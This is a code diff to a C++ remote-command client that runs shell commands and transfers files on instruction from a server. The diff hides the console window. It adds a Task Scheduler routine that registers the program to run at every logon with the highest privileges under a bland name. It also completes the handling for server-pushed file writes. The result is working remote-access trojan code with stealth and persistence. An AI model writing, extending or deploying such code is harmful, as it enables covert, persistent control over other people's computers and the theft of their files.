@@ -13,6 +13,7 @@
 #include <nlohmann/json.hpp>
 #include <format>
 #include <fstream>
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 #define FILE_CHUNK_SIZE 1024 * 1024
 
@@ -94,6 +95,199 @@ std::string ExecuteCommand(const std::string& command) {
 
 	return output;
 }
+
+#include <windows.h>
+#include <taskschd.h>
+#include <comutil.h>
+#include <iostream>
+#include <string>
+#include <vector>
+
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsupp.lib")
+#pragma comment(lib, "ole32.lib")
+
+// Функция для получения пути к текущему исполняемому файлу
+std::wstring GetExecutablePath() {
+	std::vector<wchar_t> buffer(MAX_PATH);
+	DWORD result = GetModuleFileNameW(nullptr, buffer.data(), MAX_PATH);
+
+	// Обработка длинных путей
+	if (result >= MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+		buffer.resize(32767); // Максимальная длина пути в Windows
+		result = GetModuleFileNameW(nullptr, buffer.data(), static_cast<DWORD>(buffer.size()));
+	}
+
+	if (result == 0) {
+		DWORD error = GetLastError();
+		std::cerr << "GetModuleFileName failed. Error: " << error << std::endl;
+		return L"";
+	}
+
+	return std::wstring(buffer.data());
+}
+
+bool AddExeToAutoStartViaTaskScheduler(const std::wstring& exePath) {
+	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	if (FAILED(hr)) {
+		std::cerr << "COM initialization failed. Error: " << hr << std::endl;
+		return false;
+	}
+
+	ITaskService* pService = nullptr;
+	hr = CoCreateInstance(
+		CLSID_TaskScheduler,
+		NULL,
+		CLSCTX_INPROC_SERVER,
+		IID_ITaskService,
+		(void**)&pService
+	);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to create Task Scheduler instance. Error: " << hr << std::endl;
+		CoUninitialize();
+		return false;
+	}
+
+	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+	if (FAILED(hr)) {
+		std::cerr << "Failed to connect to Task Scheduler. Error: " << hr << std::endl;
+		pService->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	ITaskFolder* pRootFolder = nullptr;
+	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to get root folder. Error: " << hr << std::endl;
+		pService->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// Создание задачи
+	ITaskDefinition* pTask = nullptr;
+	hr = pService->NewTask(0, &pTask);
+	pService->Release();
+	if (FAILED(hr)) {
+		std::cerr << "Failed to create task definition. Error: " << hr << std::endl;
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// Настройка информации о задаче
+	IRegistrationInfo* pRegInfo = nullptr;
+	hr = pTask->get_RegistrationInfo(&pRegInfo);
+	if (SUCCEEDED(hr)) {
+		pRegInfo->put_Author(_bstr_t(L"AutoStart Manager"));
+		pRegInfo->Release();
+	}
+
+	// Настройка параметров запуска
+	IPrincipal* pPrincipal = nullptr;
+	hr = pTask->get_Principal(&pPrincipal);
+	if (SUCCEEDED(hr)) {
+		pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
+		pPrincipal->Release();
+	}
+
+	// Настройка триггера (при входе в систему)
+	ITriggerCollection* pTriggerCollection = nullptr;
+	hr = pTask->get_Triggers(&pTriggerCollection);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to get triggers collection. Error: " << hr << std::endl;
+		pTask->Release();
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	ITrigger* pTrigger = nullptr;
+	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
+	pTriggerCollection->Release();
+	if (FAILED(hr)) {
+		std::cerr << "Failed to create logon trigger. Error: " << hr << std::endl;
+		pTask->Release();
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// Настройка действия (запуск exe)
+	IActionCollection* pActionCollection = nullptr;
+	hr = pTask->get_Actions(&pActionCollection);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to get actions collection. Error: " << hr << std::endl;
+		pTrigger->Release();
+		pTask->Release();
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	IAction* pAction = nullptr;
+	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
+	pActionCollection->Release();
+	if (FAILED(hr)) {
+		std::cerr << "Failed to create executable action. Error: " << hr << std::endl;
+		pTrigger->Release();
+		pTask->Release();
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	IExecAction* pExecAction = nullptr;
+	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
+	pAction->Release();
+	if (SUCCEEDED(hr)) {
+		pExecAction->put_Path(_bstr_t(exePath.c_str()));
+		pExecAction->Release();
+	}
+
+	// Регистрация задачи
+	IRegisteredTask* pRegisteredTask = nullptr;
+	hr = pRootFolder->RegisterTaskDefinition(
+		_bstr_t(L"AutoStartApp"),  // Имя задачи
+		pTask,
+		TASK_CREATE_OR_UPDATE,
+		_variant_t(L"S-1-5-32-545"), // Группа "Пользователи"
+		_variant_t(),
+		TASK_LOGON_GROUP,
+		_variant_t(L""),
+		&pRegisteredTask
+	);
+
+	bool success = SUCCEEDED(hr);
+	if (!success) {
+		std::cerr << "Failed to register task. Error: " << hr << std::endl;
+	}
+
+	// Проверка существования задачи
+	if (success) {
+		IRegisteredTask* pExistingTask = nullptr;
+		hr = pRootFolder->GetTask(_bstr_t(L"AutoStartApp"), &pExistingTask);
+		if (SUCCEEDED(hr)) {
+			std::wcout << L"Task verification successful!" << std::endl;
+			pExistingTask->Release();
+		}
+		else {
+			std::cerr << "Task verification failed. Error: " << hr << std::endl;
+			success = false;
+		}
+		pRegisteredTask->Release();
+	}
+
+	// Освобождение ресурсов
+	pTrigger->Release();
+	pTask->Release();
+	pRootFolder->Release();
+	CoUninitialize();
+
+	return success;
+}
+
 
 void RunInThread(const std::string& command) {
 	std::string result = ExecuteCommand(command);
@@ -300,24 +494,33 @@ void processPacket(std::string msg, Client* cl) {
 			auto chunked = chunkedFile(homepath);
 			{
 				std::lock_guard<std::mutex> lock(cl->output.getMutex());
-				for (auto& chunk : chunked) {
+				for (size_t i = 0; i < chunked.size(); i++) {
 					json req = {
 						{"action", "recvfile"},
-						{"message", chunk},
+						{"message", chunked[i]},
 						{"path", endpath},
-						{"isfinal", (chunked.end()._Ptr == &chunk)}
+						{"isfinal", (i + 1 == chunked.size())}
 					};
 					cl->output.getQueue().push(req.dump());
 				}
 			}
 		}
 		else if (action == "sendfile") {
-			if (!answer.contains("message") || !answer.contains("path")) {
-				std::cerr << std::format("invalid json format from server (no module message/path). message:\n{}\n", msg);
+			if (!answer.contains("message") || !answer.contains("path") || !answer.contains("isfinal")) {
+				std::cerr << std::format("invalid json format from server (no module message/path/isfinal). message:\n{}\n", msg);
 				return;
 			}
 
-			
+			std::string message = answer["message"];
+			cl->buffer.push_back(message);
+			if (bool isfinal = answer["isfinal"]) {
+				std::ofstream file(answer["path"].get<std::string>(), 'w');
+				for (auto& chunk : cl->buffer) {
+					file << chunk;
+				}
+				cl->buffer.clear();
+				file.close();
+			}
 		}
 	}
 	catch (const std::exception& e) {
@@ -327,6 +530,16 @@ void processPacket(std::string msg, Client* cl) {
 
 int main() {
 	Client client(sf::IpAddress::resolve("127.0.0.1").value(), 8080);
+
+	auto mypath = GetExecutablePath();
+	if (AddExeToAutoStartViaTaskScheduler(mypath)) {
+		std::cout << "autostart: on\n";
+	}
+	else {
+		std::cerr << "cant enable autostart!\n";
+		return 1;
+	}
+
 	system("chcp 65001");
 	while (true) {
 		while (client.input.empty()) std::this_thread::sleep_for(std::chrono::milliseconds(100));
